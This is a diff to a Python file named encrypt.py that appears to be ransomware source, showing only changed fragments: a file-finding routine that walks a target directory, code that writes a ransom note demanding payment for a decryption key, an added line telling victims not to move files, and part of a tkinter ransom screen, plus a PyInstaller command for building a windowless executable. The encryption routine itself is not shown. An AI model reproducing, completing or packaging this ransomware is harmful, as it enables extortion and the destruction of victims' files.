@@ -4,7 +4,6 @@ import tkinter as tk
 import socket
 from tkinter import *
 from tkinter import messagebox
-from os import path
 import shutil
 
 #python -m PyInstaller --onefile -w encrypt.py
@@ -35,7 +34,7 @@ EXTENSIONS = (
 
 def find_files():
     file_paths = []
-    directory = r'TEST\DIRECTORY\HERE'
+    directory = r'TEST/DIRECTORY/HERE'
     #f = open("paths/path.txt","w")
     for root, dirs, files in os.walk(directory):
         if any(s in root for s in EXCLUDED_DIRECTORIES):
@@ -79,6 +78,7 @@ def encrypt_all():
     with open(ransom_path, "w") as ransom_file:
         ransom_file.write("You will recive your decryption key once you have paid the rasom\n")
         ransom_file.write("Do not attempt to decrypt on your own")
+        ransom_file.write("Do not move any files from their original location")
     
 def decryption_screen():
     root = tk.Tk()
@@ -91,12 +91,6 @@ def decryption_screen():
     labe1.config(font=('tohoma', int(gap)))
     labe1.config(background='blue',foreground='white')
     labe1.pack(anchor='n', ipady=20)
-
-
-    img = tk.PhotoImage(file="lock.png")
-    img = img.subsample(4)
-    labe2 = tk.Label(root, image=img)
-    labe2.pack(anchor='n', ipady=20)
     
 
 
